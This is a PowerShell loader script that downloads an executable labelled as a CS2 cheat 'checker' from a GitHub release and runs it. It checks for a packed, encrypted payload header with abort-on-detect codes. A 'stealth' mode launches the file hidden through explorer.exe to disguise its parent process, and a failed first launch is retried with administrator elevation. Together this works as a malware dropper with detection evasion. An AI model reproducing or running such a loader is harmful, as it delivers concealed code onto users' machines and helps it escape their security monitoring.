# checkerN1 loader v2 - download, verify, launch, and REPORT.
#
#   mode 'diagnose' (default) : direct monitored launch, exit code captured,
#                               file kept on disk, everything written to a log
#   mode 'stealth'            : launch through explorer.exe so the parent of the
#                               process is explorer, not powershell
#
# switch with:  $env:CHK_MODE = 'stealth'   before running the one-liner
$ErrorActionPreference = 'Continue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ---------------------------------------------------------------- config
$repo      = 'cs2cheatprohack-glitch/cn1'
$tag       = '1.1'
$asset     = 'checkerN1.exe'
$expectSha = '26EA730C37A2F3EF62A9A11BA4FB77B00AFC468B2564A0FA4B7B91885DD2C0BB'
$mode      = if ($env:CHK_MODE) { $env:CHK_MODE } else { 'diagnose' }
# -----------------------------------------------------------------------

$url = "https://github.com/$repo/releases/download/$tag/$asset"
$dir = Join-Path $env:TEMP 'checkerN1'
$exe = Join-Path $dir $asset
$log = Join-Path $dir 'install.log'

function Say([string]$m) {
    $line = "[{0}] {1}" -f (Get-Date -Format 'HH:mm:ss'), $m
    Write-Host $line
    try { Add-Content -Path $log -Value $line -Encoding UTF8 } catch { }
}

if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
Say "mode=$mode  target=$url"
Say "workdir=$dir"

# ---------------------------------------------------------------- download
$ok = $false
for ($i = 1; $i -le 3; $i++) {
    try {
        Invoke-WebRequest -Uri $url -OutFile $exe -UseBasicParsing -TimeoutSec 180 -ErrorAction Stop
        $ok = $true
        break
    } catch {
        Say "download attempt $i failed: $($_.Exception.Message)"
        Start-Sleep -Seconds 2
    }
}
if (-not $ok) { Say 'FATAL: download failed'; exit 1 }

$len = (Get-Item $exe).Length
Say "downloaded $len bytes -> $exe"

$sha = (Get-FileHash $exe -Algorithm SHA256).Hash
Say "sha256 $sha"
if ($expectSha) {
    if ($sha -eq $expectSha) { Say 'hash ok' }
    else { Say "WARN: hash mismatch, expected $expectSha - the asset is not what was published" }
}

# ---------------------------------------------------------------- sanity
$head = [System.IO.File]::ReadAllBytes($exe)[0..1]
if ($head[0] -ne 0x4D -or $head[1] -ne 0x5A) { Say 'FATAL: not a PE (MZ missing)'; exit 1 }
Say 'PE header ok'

# is it a packed package for loader.cpp? that format keeps a 108 byte header at EOF
try {
    $fs = [System.IO.File]::OpenRead($exe)
    $fs.Seek(-108, 'End') | Out-Null
    $hb = New-Object byte[] 108
    [void]$fs.Read($hb, 0, 108)
    $fs.Close()
    $hs = [BitConverter]::ToUInt32($hb, 0)
    $ks = [BitConverter]::ToUInt32($hb, 4)
    $ns = [BitConverter]::ToUInt32($hb, 8)
    $fl = [BitConverter]::ToUInt32($hb, 12)
    $dl = [BitConverter]::ToUInt32($hb, 16)
    Say ("tail header: headerSize={0} keySize={1} nonceSize={2} flags=0x{3:X} delayMs={4}" -f $hs, $ks, $ns, $fl, $dl)
    if ($hs -ne 108 -or $ks -ne 32 -or $ns -ne 12) {
        Say 'NOTE: tail is NOT an ollpkg PayloadHeader - a loader.cpp stub would exit 1 here, before doing anything'
    }
} catch { Say "tail probe failed: $($_.Exception.Message)" }

# UPX marker in the first 4 KB: a UPX-packed file cannot carry an EOF header
try {
    $probe = New-Object byte[] 4096
    $fs2 = [System.IO.File]::OpenRead($exe)
    [void]$fs2.Read($probe, 0, 4096)
    $fs2.Close()
    $as = [System.Text.Encoding]::ASCII.GetString($probe)
    if ($as.Contains('UPX!')) { Say 'NOTE: UPX packed - the original image is restored in memory, the on-disk tail is not the real one' }
} catch { }

Unblock-File -Path $exe -ErrorAction SilentlyContinue

# ---------------------------------------------------------------- launch
if ($mode -eq 'stealth') {
    Say 'launching through explorer.exe (parent will be explorer)'
    Start-Process explorer.exe -ArgumentList "`"$exe`"" -WindowStyle Hidden
    Start-Sleep -Seconds 4
    $p = Get-Process -Name ([System.IO.Path]::GetFileNameWithoutExtension($exe)) -ErrorAction SilentlyContinue
    if ($p) { Say ("running, pid {0}" -f $p.Id) } else { Say 'no process after 4 s - it started and died, or never opened' }
} else {
    Say 'launching directly (monitored)'
    $proc = Start-Process -FilePath $exe -WorkingDirectory $dir -PassThru
    Start-Sleep -Seconds 4
    if ($proc.HasExited) {
        $code = $proc.ExitCode
        Say ("exited immediately, exit code = {0} (0x{1:X})" -f $code, $code)
        Say 'exit code map: 1 = stub rejected the file (bad header or tag) | 3 = abort-on-detect tripped | 0xC000xxxx = crash | 0 = ran and returned'
        Say 'retrying elevated (accept the UAC prompt)...'
        try {
            Start-Process -FilePath $exe -WorkingDirectory $dir -Verb RunAs | Out-Null
            Say 'elevated instance requested'
        } catch { Say "elevated launch failed: $($_.Exception.Message)" }
    } else {
        Say ("running, pid {0}" -f $proc.Id)
    }
}

Say "file kept at $exe - run it by hand if you want to see the window"
Say "log: $log"
